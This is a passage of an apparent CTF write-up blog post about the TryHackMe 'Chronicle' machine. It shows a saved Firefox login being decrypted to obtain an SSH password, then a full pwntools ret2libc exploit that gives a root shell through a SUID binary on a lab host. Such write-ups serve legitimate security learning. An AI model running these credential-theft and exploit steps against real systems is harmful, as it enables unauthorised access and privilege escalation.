+</span></span><span style="display:flex;"><span>Found /var/lib/mlocate/mlocate.db: regular file, no read permission
+</span></span></code></pre></div><p>This bit was very interesting to me as we see we have some browser profile, which means we could have some saved passwords. Let us dig through.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>tommy@incognito:/home/carlJ/.mozilla/firefox/0ryxwn4c.default-release$ cat logins.json 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;nextId&#34;</span>:2,<span style="color:#e6db74">&#34;logins&#34;</span>:<span style="color:#f92672">[{</span><span style="color:#e6db74">&#34;id&#34;</span>:1,<span style="color:#e6db74">&#34;hostname&#34;</span>:<span style="color:#e6db74">&#34;https://incognito.com&#34;</span>,<span style="color:#e6db74">&#34;httpRealm&#34;</span>:null,<span style="color:#e6db74">&#34;formSubmitURL&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;usernameField&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;passwordField&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;encryptedUsername&#34;</span>:<span style="color:#e6db74">&#34;MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECH3X/raFuZgKBAigmhgQUXDMnw==&#34;</span>,<span style="color:#e6db74">&#34;encryptedPassword&#34;</span>:<span style="color:#e6db74">&#34;MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECIe5VgWeABJZBBB7v9DPVoaXvgQm79RM1WuM&#34;</span>,<span style="color:#e6db74">&#34;guid&#34;</span>:<span style="color:#e6db74">&#34;{32c188bb-6b46-45b4-b566-4b1d8e1c8f87}&#34;</span>,<span style="color:#e6db74">&#34;encType&#34;</span>:1,<span style="color:#e6db74">&#34;timeCreated&#34;</span>:1616952631202,<span style="color:#e6db74">&#34;timeLastUsed&#34;</span>:1616952631202,<span style="color:#e6db74">&#34;timePasswordChanged&#34;</span>:1616952631202,<span style="color:#e6db74">&#34;timesUsed&#34;</span>:1<span style="color:#f92672">}]</span>,<span style="color:#e6db74">&#34;potentiallyVulnerablePasswords&#34;</span>:<span style="color:#f92672">[]</span>,<span style="color:#e6db74">&#34;dismissedBreachAlertsByLoginGUID&#34;</span>:<span style="color:#f92672">{}</span>,<span style="color:#e6db74">&#34;version&#34;</span>:3<span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>Interesting enough, looking at the logins json file we see that we have an encrypted username and an encrypted password. We could download this and use a neat decrypt script. To learn more about browser forensics I used my good friend&rsquo;s <a href="https://05t3.github.io/posts/DCTF/#hidden-fox">article</a>. Where he talks about how he was able to decrypt a profile to get some information that was stored in there, we can also use the same ideas to work around here.</p>
+<hr>
+<p>Using firefox decrypt script we are actually able to crack our profile and get a username and password as so</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dexter@lab:~/lab/THM/chronicle$ python3 firefox_decrypt.py /home/dexter/lab/THM/chronicle/10.10.202.252:8080/0ryxwn4c.default-release
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2024-02-15 08:00:01,162 - WARNING - profile.ini not found in /home/dexter/lab/THM/chronicle/10.10.202.252:8080/0ryxwn4c.default-release
+</span></span><span style="display:flex;"><span>2024-02-15 08:00:01,164 - WARNING - Continuing and assuming <span style="color:#e6db74">&#39;/home/dexter/lab/THM/chronicle/10.10.202.252:8080/0ryxwn4c.default-release&#39;</span> is a profile location
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Primary Password <span style="color:#66d9ef">for</span> profile /home/dexter/lab/THM/chronicle/10.10.202.252:8080/0ryxwn4c.default-release: 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Website:   https://incognito.com
+</span></span><span style="display:flex;"><span>Username: <span style="color:#e6db74">&#39;dev&#39;</span>
+</span></span><span style="display:flex;"><span>Password: <span style="color:#e6db74">&#39;Pas$w0RD59247&#39;</span>
+</span></span></code></pre></div><p>So no we can use that and ssh to the other user we saw earlier</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dexter@lab:~/lab/THM/chronicle$ ssh carlJ@10.10.202.252
+</span></span><span style="display:flex;"><span>carlJ@10.10.202.252<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 18.04.5 LTS <span style="color:#f92672">(</span>GNU/Linux 4.15.0-142-generic x86_64<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
+</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
+</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  System information as of Thu Feb <span style="color:#ae81ff">15</span> 13:04:26 UTC <span style="color:#ae81ff">2024</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  System load:  0.0               Processes:           <span style="color:#ae81ff">101</span>
+</span></span><span style="display:flex;"><span>  Usage of /:   60.9% of 8.79GB   Users logged in:     <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>  Memory usage: 55%               IP address <span style="color:#66d9ef">for</span> eth0: 10.10.202.252
+</span></span><span style="display:flex;"><span>  Swap usage:   0%
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">73</span> packages can be updated.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> update is a security update.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*** System restart required ***
+</span></span><span style="display:flex;"><span>Last login: Sat Apr  <span style="color:#ae81ff">3</span> 20:24:03 <span style="color:#ae81ff">2021</span> from 192.168.29.217
+</span></span><span style="display:flex;"><span>carlJ@incognito:~$ 
+</span></span></code></pre></div><h2 id="privilege-escalation">Privilege escalation</h2>
+<p>So now looking around under the mailing directory we find ourselves a little binary.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>carlJ@incognito:~/mailing$ ls -la
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span>drwx------ <span style="color:#ae81ff">2</span> carlJ carlJ <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2021</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">8</span> carlJ carlJ <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2021</span> ..
+</span></span><span style="display:flex;"><span>-rwsrwxr-x <span style="color:#ae81ff">1</span> root  root  <span style="color:#ae81ff">8544</span> Apr  <span style="color:#ae81ff">3</span>  <span style="color:#ae81ff">2021</span> smail
+</span></span></code></pre></div><p>Our executable is owned by root, and this really is interesting since we can use some binary exploitation skills to enable us to get root.</p>
+<p>So here we notice we have something like a return to libc form of methodology, where we call the system function that already resides in the libc, since again the binary is dynamically allocated.</p>
+<p>To check for the libc being used by the binary we use <code>ldd</code> example</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>carlJ@incognito:~/mailing$ ldd smail
+</span></span><span style="display:flex;"><span>        linux-vdso.so.1 <span style="color:#f92672">(</span>0x00007ffff7ffa000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        libc.so.6 <span style="color:#f92672">=</span>&gt; /lib/x86_64-linux-gnu/libc.so.6 <span style="color:#f92672">(</span>0x00007ffff79e2000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        /lib64/ld-linux-x86-64.so.2 <span style="color:#f92672">(</span>0x00007ffff7dd3000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>carlJ@incognito:~/mailing$ ldd smail
+</span></span><span style="display:flex;"><span>        linux-vdso.so.1 <span style="color:#f92672">(</span>0x00007ffff7ffa000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        libc.so.6 <span style="color:#f92672">=</span>&gt; /lib/x86_64-linux-gnu/libc.so.6 <span style="color:#f92672">(</span>0x00007ffff79e2000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        /lib64/ld-linux-x86-64.so.2 <span style="color:#f92672">(</span>0x00007ffff7dd3000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>carlJ@incognito:~/mailing$ 
+</span></span></code></pre></div><p>We notice that our libc does not change the base so that would mean that <code>ASLR</code> is off here.</p>
+<hr>
+<p>What is ASLR though? ASLR or address space layout randomization is a computer security technique involved in preventing exploitation of memory corruption vulnerabilities <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization">ASLR</a></p>
+<p>What ASLR does is randomize memory addresses making it more difficult to predict a target address.</p>
+<hr>
+<p>So in our case we don&rsquo;t have that on and so predicting target addresses is pretty simple, we can now predict where the system call is and actually call it and get a shell as root.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>from pwn import *
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;./smail&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>base <span style="color:#f92672">=</span> 0x00007ffff79e2000 <span style="color:#75715e">#0x00007f790800e000</span>
+</span></span><span style="display:flex;"><span>sh <span style="color:#f92672">=</span>  base + 0x1b3e1a <span style="color:#75715e">#0x19604f</span>
+</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> base + 0x4f550  <span style="color:#75715e">#0x4c920 </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> 0x4007f3
+</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> 0x400556
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">=</span> b<span style="color:#e6db74">&#39;A&#39;</span> * <span style="color:#ae81ff">72</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> buffer + p64<span style="color:#f92672">(</span>ret<span style="color:#f92672">)</span> + p64<span style="color:#f92672">(</span>pop_rdi<span style="color:#f92672">)</span> + p64<span style="color:#f92672">(</span>sh<span style="color:#f92672">)</span> + p64<span style="color:#f92672">(</span>system<span style="color:#f92672">)</span> + p64<span style="color:#f92672">(</span>0x0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p.clean<span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span>p.sendline<span style="color:#f92672">(</span>b<span style="color:#e6db74">&#34;2&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>p.sendline<span style="color:#f92672">(</span>payload<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>p.interactive<span style="color:#f92672">()</span>
+</span></span></code></pre></div><p>And we are root.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>carlJ@incognito:~/mailing$ python3 a.py 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Checking <span style="color:#66d9ef">for</span> new versions of pwntools
+</span></span><span style="display:flex;"><span>    To disable this functionality, set the contents of /home/carlJ/.cache/.pwntools-cache-3.6/update to <span style="color:#e6db74">&#39;never&#39;</span> <span style="color:#f92672">(</span>old way<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>    Or add the following lines to ~/.pwn.conf <span style="color:#f92672">(</span>or /etc/pwn.conf system-wide<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">[</span>update<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>        interval<span style="color:#f92672">=</span>never
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> An issue occurred <span style="color:#66d9ef">while</span> checking PyPI
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> You have the latest version of Pwntools <span style="color:#f92672">(</span>4.4.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;./smail&#39;</span>: pid <span style="color:#ae81ff">10141</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
+</span></span><span style="display:flex;"><span>Write your signature...
+</span></span><span style="display:flex;"><span>Changed
+</span></span><span style="display:flex;"><span>$ id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>carlJ<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>carlJ<span style="color:#f92672">)</span>
+</span></span></code></pre></div></div>
+				
+				<footer class="entry__footer">
+					
+<div class="entry__tags">
+			<a class="entry__tag btn" href="/blog/tags/binary-exploitation/">Binary Exploitation</a>
+			<a class="entry__tag btn" href="/blog/tags/web/">Web</a>
+</div>
+					
+<div class="entry__share share">
+	<a class="share__link btn" title="Share on Twitter" href="https://twitter.com/intent/tweet/?url=http%3a%2f%2flocalhost%3a1313%2fblog%2fposts%2fthm%2fchronicle%2f&amp;text=Chronicles" target="_blank" rel="noopener noreferrer" onclick="window.open(this.href, 'Share on Twitter', 'width=800,height=450,resizable=yes,toolbar=0,status=0'); return false">
+		<svg class="share__icon" aria-label="Twitter" role="img" width="32" height="32" viewBox="0 0 512 512"><path d="M437 152a72 72 0 0 1-40 12 72 72 0 0 0 32-40 72 72 0 0 1-45 17 72 72 0 0 0-122 65 200 200 0 0 1-145-74 72 72 0 0 0 22 94 72 72 0 0 1-32-7 72 72 0 0 0 56 69 72 72 0 0 1-32 1 72 72 0 0 0 67 50 200 200 0 0 1-105 29 200 200 0 0 0 309-179 200 200 0 0 0 35-37"/></svg>
+	</a>
+	<a class="share__link btn" title="Share on LinkedIn" href="https://www.linkedin.com/shareArticle?mini=true&url=http%3a%2f%2flocalhost%3a1313%2fblog%2fposts%2fthm%2fchronicle%2f&title=Chronicles" target="_blank" rel="noopener noreferrer" onclick="window.open(this.href, 'Share on LinkedIn', 'width=640,height=480,toolbar=0,status=0'); return false">
+		<svg class="share__icon" aria-label="LinkedIn" role="img" width="32" height="32" viewBox="0 0 512 512"><circle cx="142" cy="138" r="37"/><path stroke-width="66" d="M244 194v198M142 194v198"/><path d="M276 282c0-20 13-40 36-40 24 0 33 18 33 45v105h66V279c0-61-32-89-76-89-34 0-51 19-59 32"/></svg>
+	</a>
+</div>
+				</footer>
+				
+			</article>
+		</div>
+	</main>
+	
+<div class="authorbox block">
+	<div class="author">
+		<div class="author__body">
+			<div class="author__name">
+				Dexter
+			</div>
+			<div class="author__bio">Just human</div>
+		</div>
+	</div>
+</div>
+	
+
+
+
+	
+
+	</div>
+	<footer class="footer">
+<div class="footer__social social">
+		<a class="social__link" target="_blank" rel="noopener noreferrer" href="mailto:dexter7isme@gmail.com">
+			<svg class="social__icon" aria-label="Email" role="img" width="32" height="32" viewBox="0 0 512 512"><path d="M299 268l124 106c-4 4-10 7-17 7H106c-7 0-13-3-17-7l124-106 43 38 43-38zm-43 13L89 138c4-4 10-7 17-7h300c7 0 13 3 17 7L256 281zm54-23l121-105v208L310 258zM81 153l121 105L81 361V153z"/></svg>
+		</a>
+		<a class="social__link" target="_blank" rel="noopener noreferrer" href="https://github.com/w-47">
+			<svg class="social__icon" aria-label="Github" role="img" width="32" height="32" viewBox="0 0 512 512"><path d="M335 499c14 0 12 17 12 17H165s-2-17 12-17c13 0 16-6 16-12l-1-50c-71 16-86-28-86-28-12-30-28-37-28-37-24-16 1-16 1-16 26 2 40 26 40 26 22 39 59 28 74 22 2-17 9-28 16-35-57-6-116-28-116-126 0-28 10-51 26-69-3-6-11-32 3-67 0 0 21-7 70 26 42-12 86-12 128 0 49-33 70-26 70-26 14 35 6 61 3 67 16 18 26 41 26 69 0 98-60 120-117 126 10 8 18 24 18 48l-1 70c0 6 3 12 16 12z"/></svg>
+		</a>
+</div>
+	<div class="footer__copyright">© 2025 Dexter. <span class="footer__copyright-credits">Powered by <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/vimux/binario" rel="nofollow noopener" target="_blank">Binario</a> theme.</span></div>
+</footer>
+</body>
+</html>
